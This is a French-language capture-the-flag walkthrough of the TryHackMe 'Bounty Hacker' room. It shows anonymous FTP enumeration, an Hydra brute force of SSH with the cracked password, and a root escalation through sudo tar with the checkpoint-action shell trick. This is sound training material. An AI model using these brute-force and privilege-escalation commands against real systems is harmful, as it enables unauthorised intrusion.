# Bounty Hacker — Walkthrough

🔗 **Room TryHackMe :** [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

<p align="center">
  <img src="./bounty-hacker-logo.png" alt="Logo Bounty Hacker" width="240">
</p>

```diff
> FTP anonyme donne les indices • Hydra trouve la clé • sudo tar ouvre la salle du trône
```

---

## ℹ️ Informations

- **Plateforme :** TryHackMe
- **Difficulté :** débutant
- **Thème :** bounty hacker spatial, ambiance western cyberpunk et terminal qui clignote
- **Objectif :** obtenir un accès SSH, récupérer `user.txt`, escalader en `root`, puis récupérer `root.txt`
- **Services exposés :** FTP, SSH et HTTP
- **Techniques principales :** énumération FTP anonyme, brute force SSH, escalade de privilèges via sudo

---

## 🧠 Reconnaissance

### Scan des ports

On commence par identifier les services accessibles :

```bash
nmap -sC -sV -oN nmap.txt bountyhacker.thm
```

Résultats importants :

```text
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

Le scan nous donne trois portes d'entrée :

- FTP sur le port `21`
- SSH sur le port `22`
- HTTP sur le port `80`

La ligne la plus intéressante concerne FTP. Le scan indique que la connexion anonyme est autorisée :

```text
ftp-anon: Anonymous FTP login allowed
```

👉 **Insight :**
Quand le FTP anonyme est activé dans une CTF, il faut aller voir. C'est rarement décoratif. C'est plutôt un panneau néon qui clignote : "viens télécharger mes petits fichiers suspects".

---

## 📂 Énumération FTP

On se connecte au FTP avec le compte anonyme :

```bash
ftp anonymous@bountyhacker.thm
```

Une fois connecté, on liste les fichiers :

```text
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

On télécharge les deux fichiers :

```text
ftp> get locks.txt
ftp> get task.txt
ftp> exit
```

On inspecte ensuite `task.txt` :

```bash
cat task.txt
```

Résultat :

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

La signature en bas du fichier est l'information importante. Le fichier semble avoir été écrit par `lin`, ce qui nous donne un nom d'utilisateur probable.

On regarde ensuite `locks.txt` :

```bash
cat locks.txt
```

Le fichier contient une liste de mots de passe candidats sur le thème du dragon, avec des entrées comme :

```text
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
RedDr4gonSynd1cat3
ReDSynd1ca7e
```

Nous avons donc :

- **Utilisateur probable :** `lin`
- **Liste de mots de passe :** `locks.txt`

👉 **Insight :**
La cible vient pratiquement de nous donner un utilisateur et une wordlist. Niveau chasse à la prime, on est moins sur "traquer un fugitif intergalactique" que sur "il a laissé son adresse et son reçu de snack sur la table".

---

## 🔐 Attaque sur les identifiants

On crée un petit fichier contenant le nom d'utilisateur :

```bash
echo lin > user.txt
```

Puis on lance Hydra contre SSH :

```bash
hydra -L user.txt -P locks.txt ssh://bountyhacker.thm
```

Hydra trouve des identifiants valides :

```text
[22][ssh] host: bountyhacker.thm   login: lin   password: RedDr4gonSynd1cat3
```

Identifiants :

```text
lin:RedDr4gonSynd1cat3
```

👉 **Insight :**
Une wordlist n'a pas besoin d'être gigantesque si elle est bien ciblée. Vingt-six bons candidats peuvent battre un million de mots aléatoires quand le thème du challenge fait déjà la moitié du travail.

---

## 🐚 Accès SSH

On se connecte en SSH :

```bash
ssh lin@bountyhacker.thm
```

Avec le mot de passe trouvé par Hydra :

```text
RedDr4gonSynd1cat3
```

Une fois connecté, on obtient un shell en tant que `lin` :

```text
lin@ip-10-65-138-64:~/Desktop$
```

On peut alors regarder le contenu du dossier et lire le flag utilisateur :

```bash
ls
cat user.txt
```

🚩 L'accès utilisateur est validé.

👉 **Insight :**
Le premier shell n'est pas la fin. C'est le hall d'entrée. On respire, on vérifie les privilèges, et on évite de casser les meubles sauf si les meubles ont des permissions sudo intéressantes.

---

## ⬆️ Escalade de privilèges

### Permissions sudo

On vérifie ce que `lin` peut exécuter avec des privilèges élevés :

```bash
sudo -l
```

Résultat :

```text
User lin may run the following commands on ip-10-65-138-64:
    (root) /bin/tar
```

Voilà notre chemin d'escalade. L'utilisateur `lin` peut exécuter `/bin/tar` en tant que `root`.

C'est le moment où GTFOBins devient le grimoire cyberpunk de service.

### Abus de tar

GTFOBins documente une technique sudo pour `tar` avec les actions de checkpoint. On exécute :

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

On obtient alors un shell root :

```text
# whoami
root
```

Pourquoi ça fonctionne :

- `tar` est autorisé via sudo en tant que `root`.
- `--checkpoint=1` déclenche une action pendant le traitement de l'archive.
- `--checkpoint-action=exec=/bin/sh` demande à `tar` d'exécuter `/bin/sh`.
- Comme `tar` tourne en tant que `root`, le shell hérite des privilèges root.

Dans la vie normale, `tar` sert à archiver des fichiers. Dans une CTF, `tar` peut parfois devenir un ascenseur très suspect vers le dernier étage.

👉 **Insight :**
Après avoir obtenu un shell, `sudo -l` est un réflexe essentiel. Un seul binaire autorisé peut suffire à compromettre complètement la machine s'il permet d'exécuter des commandes.

---

## 👑 Flag root

On localise le flag root :

```bash
find / -type f -name root.txt 2>/dev/null
```

Le fichier se trouve ici :

```text
/root/root.txt
```

On le lit :

```bash
cat /root/root.txt
```

Flag root :

```text
THM{REDACTED}
```

---

## 🧠 Conclusion

Cette room montre une chaîne d'attaque très propre pour débuter :

- énumération des services
- accès FTP anonyme
- extraction d'indices depuis des fichiers téléchargés
- brute force SSH avec une wordlist ciblée
- escalade sudo avec GTFOBins

Le chemin est simple, mais il récompense l'attention aux détails. Le nom d'utilisateur n'est pas caché derrière dix couches de chiffrement cosmique. Il est signé en bas d'une note, comme si même dans le futur quelqu'un croyait encore aux signatures d'email.

---

```diff
> FTP a donné l'indice • Hydra a trouvé le code • tar est devenu l'ascenseur root
```

## 🔗 Références

- [TryHackMe - Bounty Hacker](https://tryhackme.com/room/cowboyhacker)
- [GTFOBins - tar](https://gtfobins.github.io/gtfobins/tar/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)

---

Les notes brutes de résolution sont conservées dans [BountyHacker-Notes.md](BountyHacker-Notes.md).
